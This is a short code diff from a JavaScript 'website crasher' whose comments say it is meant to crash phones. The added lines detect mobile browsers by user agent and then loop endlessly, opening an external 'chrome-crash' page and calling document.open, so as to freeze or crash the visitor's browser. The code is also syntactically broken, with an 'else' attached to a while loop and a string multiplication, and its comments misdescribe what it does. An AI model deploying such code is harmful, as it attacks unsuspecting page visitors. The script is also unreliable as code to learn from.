@@ -35,8 +35,14 @@ while(1) {
    // Unsuccessful Attemps At The Crasher May Cause Severe Lag.
  
    // (Website Crasher For IOS and android And Mostly Every Phone) 
-   window.open("https://the-imortal-crasher.github.io/chrome-crash/", "_false",) * '#/hisbck'; // Creates An Infinite Loop Of Undefined While Still Linking
-   document.open('#' + $x); // Forces A Link With No Function To Be Made.     
+   if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {  
+     while(1) {
+        window.open("https://the-imortal-crasher.github.io/chrome-crash/", "_false",) * '#/hisbck'; // Creates An Infinite Loop Of Undefined While Still Linking
+        document.open('#' + $x); // Forces A Link With No Function To Be Made.
+     } else {
+       continue;
+     }
+   }
 } 
     
 
